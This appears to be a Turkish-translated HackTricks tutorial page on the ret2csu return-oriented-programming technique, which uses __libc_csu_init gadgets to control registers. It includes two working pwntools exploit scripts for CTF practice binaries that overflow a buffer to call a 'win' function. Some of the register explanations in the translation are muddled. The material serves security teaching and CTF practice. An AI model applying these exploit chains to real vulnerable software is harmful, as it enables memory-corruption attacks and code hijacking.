# Ret2csu

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 **Discord grubuna** katılın](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

##

## [https://www.scs.stanford.edu/brop/bittau-brop.pdf](https://www.scs.stanford.edu/brop/bittau-brop.pdf)Temel Bilgiler

**ret2csu**, bir programın kontrolünü ele geçirmeye çalışırken genellikle programın davranışını manipüle etmek için kullandığınız **gadget'ları** bulamadığınızda kullanılan bir hackleme tekniğidir.

Bir program belirli kütüphaneleri (örneğin libc) kullandığında, programın farklı parçalarının birbirleriyle nasıl iletişim kuracakları konusunda yönetim işlevleri için bazı yerleşik işlevlere sahiptir. Bu işlevler arasında, özellikle `__libc_csu_init` adı verilen bir tanesi gibi, eksik gadget'larımız olarak hareket edebilecek bazı gizli mücevherler bulunmaktadır.

### \_\_libc\_csu\_init'teki Sihirli Gadget'lar

**`__libc_csu_init`** içinde vurgulanması gereken iki talimat dizisi (gadget) bulunmaktadır:

1. İlk dizi, birkaç kayıtta (rbx, rbp, r12, r13, r14, r15) değerler ayarlamamıza olanak tanır. Bunlar, daha sonra kullanmak istediğimiz sayıları veya adresleri saklayabileceğimiz yuvalar gibidir.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Bu cihaz, bu kaynakları yığınından çıkararak bunları kontrol etmemizi sağlar.

2. İkinci sıra, kurduğumuz değerleri kullanarak birkaç şey yapmak için kullanılır:
* **Belirli değerleri diğer kayıtlara taşır**, bunları işlevlerde parametre olarak kullanılmaya hazır hale getirir.
* r15 ve rbx'deki değerleri toplayarak belirlenen bir konuma **çağrı yapar**, ardından rbx'i 8 ile çarpar.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
2. Belki de oraya yazmak için herhangi bir adres bilmiyorsunuz ve bir `ret` talimatına ihtiyacınız var. İkinci cihazın da bir `ret` ile sona ereceğini unutmayın, ancak ona ulaşmak için bazı **koşulları karşılamanız gerekecek**:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Koşullar şunlar olacak:

* `[r12 + rbx*8]`, çağrılabilir bir işlevi depolayan bir adrese işaret etmelidir (fikir yoksa ve pie yoksa, sadece `_init` işlevini kullanabilirsiniz):
* Eğer \_init `0x400560` adresindeyse, GEF'i kullanarak bellekte ona işaret eden bir işaretçi arayın ve `[r12 + rbx*8]`, \_init'e işaret eden işaretçiye sahip adres olsun:
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef➤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  →   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  →   "\x60\x05\x40[...]"
```
* `rbp` ve `rbx`nin aynı değere sahip olması zıplamayı önlemek için gereklidir
* Dikkate almanız gereken bazı atlanmış pop'lar bulunmaktadır

## RDI ve RSI

Ret2csu cihazından **`rdi`** ve **`rsi`**'yi kontrol etmenin başka bir yolu, belirli ofsetlere erişerek yapılır:

<figure><img src="../../.gitbook/assets/image (2).png" alt="" width="283"><figcaption><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>

Daha fazla bilgi için bu sayfaya bakın:

{% content-ref url="brop-blind-return-oriented-programming.md" %}
[brop-blind-return-oriented-programming.md](brop-blind-return-oriented-programming.md)
{% endcontent-ref %}

## Örnek

### Çağrıyı Kullanma

Bir sistem çağrısı yapmak veya `write()` gibi bir işlevi çağırmak istediğinizi hayal edin, ancak `rdx` ve `rsi` kayıtlarında belirli değerlere ihtiyacınız var. Normalde, bu kayıtları doğrudan ayarlayan cihazları arardınız, ancak hiçbirini bulamazsınız.

İşte burada **ret2csu** devreye giriyor:

1. **Kayıtları Ayarlayın**: İlk sihirli cihazı kullanarak yığınından değerleri alıp rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) ve r15'e yerleştirin.
2. **İkinci Cihazı Kullanın**: Bu kayıtlar ayarlandıktan sonra ikinci cihazı kullanırsınız. Bu, seçtiğiniz değerleri `rdx` ve `rsi`'ye (sırasıyla r14 ve r13'ten) taşımanıza olanak tanır, işlev çağrısı için parametreleri hazırlar. Dahası, `r15` ve `rbx`'i kontrol ederek, hesapladığınız ve `[r15 + rbx*8]`'e yerleştirdiğiniz adresteki bir işlevi çağırabilirsiniz.

Bu tekniği kullanan ve açıklayan bir [**örneğe buradan ulaşabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), ve kullanılan son saldırı şudur:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Önceki saldırının bir **`RCE`** yapmak için değil, sadece `win` adlı bir işlevi çağırmak için tasarlandığını unutmayın (`win` adresini stdin'den alarak ROP zincirinde gets'i çağırmak ve r15'e depolamak).
{% endhint %}

### Çağrıyı atlayarak ve ret'e ulaşarak geçme

Aşağıdaki saldırı, [**bu sayfadan**](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/ropemporium\_ret2csu/index.html) çıkarılmıştır, burada **ret2csu** kullanılmış ancak çağrı yerine karşılaştırmaları atlayarak ve çağrıdan sonra `ret`'e ulaşarak:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### Neden Sadece libc'yi Kullanmıyoruz?

Genellikle bu durumlar [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/) ile de savunmasız olabilir, ancak bazen doğrudan libc içinde bulduğunuz gadget'larla kolayca kontrol edilemeyen daha fazla parametreyi kontrol etmeniz gerekebilir. Örneğin, `write()` fonksiyonu üç parametre gerektirir ve **bu parametreleri doğrudan ayarlamak için gerekli olan gadget'ları bulmak mümkün olmayabilir**.
